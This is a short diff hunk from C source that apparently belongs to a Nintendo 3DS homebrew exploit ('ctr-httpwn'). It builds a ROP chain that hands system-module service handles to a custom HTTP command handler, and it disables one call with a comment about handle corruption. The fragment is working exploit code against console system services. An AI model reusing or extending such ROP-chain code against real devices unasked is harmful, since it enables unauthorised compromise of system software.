@@ -377,7 +377,7 @@ void buildrop_http(u32 *ropchain, u32 *ropvaddr, u32 ropchain_maxsize)
 	ropgen_callfunc(&ropchain, ropvaddr, ROP_httpc_AddRequestHeader, params);//Once this finishes, the ctr-httpwn custom-cmdhandler will be available via the context session handle.
 
 	ropgen_httpc_customcmd(&ropchain, ropvaddr, httpctx, 0, 0, BOSS_psps_sessionhandle);//Send the sysmodule psps handle to the httpc custom-cmdhandler.
-	ropgen_httpc_customcmd(&ropchain, ropvaddr, httpctx, 0, 1, BOSS_fsuser_sessionhandle);//Send the sysmodule fsuser handle to the httpc custom-cmdhandler.
+	//ropgen_httpc_customcmd(&ropchain, ropvaddr, httpctx, 0, 1, BOSS_fsuser_sessionhandle);//Send the sysmodule fsuser handle to the httpc custom-cmdhandler. Disabled since sending handleindex1 corrupts handleindex0 in http-sysmodule currently.
 
 	//Copy the sysmodule psps handle to ropheap+0x20, then overwrite the sysmodule psps handle with the custom-cmdhandler session handle. Then close the original handle since it's not used under BOSS sysmodule at this point.
 	ropgen_copyu32(&ropchain, ropvaddr, BOSS_psps_sessionhandle, ropheap+0x20, 0x3);
